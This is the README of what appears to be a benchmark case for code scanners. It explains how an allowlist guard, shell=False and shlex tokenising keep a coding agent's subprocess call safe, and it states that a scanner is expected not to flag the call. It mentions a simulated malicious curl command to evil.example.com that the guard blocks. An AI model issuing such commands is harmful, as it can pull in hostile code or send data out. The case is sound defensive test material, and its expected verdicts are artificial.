# PY-CS-001: Coding Agent — Allowlisted Command Execution

## Scenario

A coding agent assists developers by running test suites, linters, and
type-checkers on their behalf. An LLM planner suggests which commands to
execute, and a command runner tool dispatches them via `subprocess.run()`.

## Why this code is SAFE

The `command_runner.py` tool calls `subprocess.run()`, which static
analysis tools commonly flag as a command injection sink. However, the
call is properly guarded:

1. **Hardcoded allowlist** — `guards/command_policy.py` defines an
   immutable `frozenset` of permitted command prefixes: `pytest`,
   `ruff check`, `mypy`, and `black --check`. This set cannot be modified
   at runtime.

2. **Pre-execution policy check** — Every command passes through
   `check_command()` before any subprocess is spawned. If the command does
   not match an allowlist entry, execution is refused and the function
   returns an error result immediately.

3. **shell=False** — The subprocess is invoked with `shell=False` and the
   command string is tokenised via `shlex.split()`, preventing shell
   metacharacter injection even for allowed commands.

4. **Malicious input is blocked** — The planner deliberately includes a
   simulated malicious command (`curl http://evil.example.com/...`). The
   allowlist guard correctly rejects it.

## Source / Carrier / Sink analysis

- **Source**: LLM planner output (model-controlled command string)
- **Carrier**: Agent router passes planner output to `run_command()`
- **Sink**: `subprocess.run()` in `command_runner.py` (line 76)
- **Guard**: `check_command()` allowlist gate (lines 57-69) — blocks all
  commands not matching the hardcoded allowlist

## What a scanner should do

A scanner should recognise the allowlist guard and **not** flag the
`subprocess.run()` call in `command_runner.py` (region R1, lines 39-101)
as a command injection vulnerability.
